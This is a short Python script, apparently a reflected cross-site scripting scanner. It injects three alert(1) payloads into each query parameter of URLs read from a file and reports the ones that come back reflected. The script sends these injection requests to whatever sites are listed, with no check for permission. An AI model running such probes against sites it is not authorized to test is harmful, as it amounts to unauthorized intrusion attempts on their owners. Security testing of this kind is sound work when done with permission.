import requests
import urllib.parse

# Basic XSS test payloads
payloads = [
    "<script>alert(1)</script>",
    "\" onmouseover=alert(1) x=\"",
    "';alert(1);//",
]

# Read param URLs
with open("output/params.txt", "r") as f:
    urls = [line.strip() for line in f.readlines() if "?" in line]

print(f"[+] Loaded {len(urls)} parameterized URLs for injection.\n")

for url in urls:
    parsed = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qs(parsed.query)

    for param in qs:
        for payload in payloads:
            qs_copy = qs.copy()
            qs_copy[param] = payload

            new_query = urllib.parse.urlencode(qs_copy, doseq=True)
            new_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"

            try:
                r = requests.get(new_url, timeout=7)
                if payload in r.text:
                    print(f"[💥] Reflected Payload: {payload}\n→ {new_url}\n")
            except Exception as e:
                print(f"[!] Error on: {new_url}")